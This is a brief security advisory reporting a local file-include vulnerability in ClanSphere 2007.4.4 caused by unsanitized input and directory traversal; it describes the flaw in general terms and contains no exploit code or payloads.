ClanSphere is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.

An attacker can exploit this vulnerability using directory-traversal strings to access potentially sensitive information that may aid in further attacks.

ClanSphere 2007.4.4 is vulnerable to this issue; other versions may also be affected.
